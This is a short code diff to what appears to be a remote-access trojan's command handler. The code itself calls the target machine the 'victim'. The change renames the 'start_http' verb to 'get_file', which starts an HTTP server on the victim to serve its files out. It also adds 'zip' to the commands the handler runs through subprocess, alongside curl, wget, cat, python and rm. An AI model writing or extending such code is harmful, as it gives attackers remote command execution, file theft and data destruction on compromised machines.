@@ -35,11 +35,12 @@ def run_command(command):
         elif verb == "mkdir":
             os.makedirs(words[1], exist_ok=True)
             return f"Directory {words[1]} created!"
-        elif verb == "start_http":
+        elif verb == "get_file":
             threading.Thread(target=start_http, args=(int(words[1]),), daemon=True).start()
-            return f"HTTP server created on victim with port {words[1]}"
+            return f"HTTP {words[1]}"
+            #return f"HTTP server created on victim with port {words[1]}"
         else:
-            if verb == "curl" or verb == "wget" or verb == "cat" or verb == "python3" or verb == "python" or verb == "rm":
+            if verb == "curl" or verb == "wget" or verb == "cat" or verb == "python3" or verb == "python" or verb == "zip" or verb == "rm":
                 needs_shell = False
             result = subprocess.run(words, shell=needs_shell, capture_output=True, text=True)
             output = result.stdout
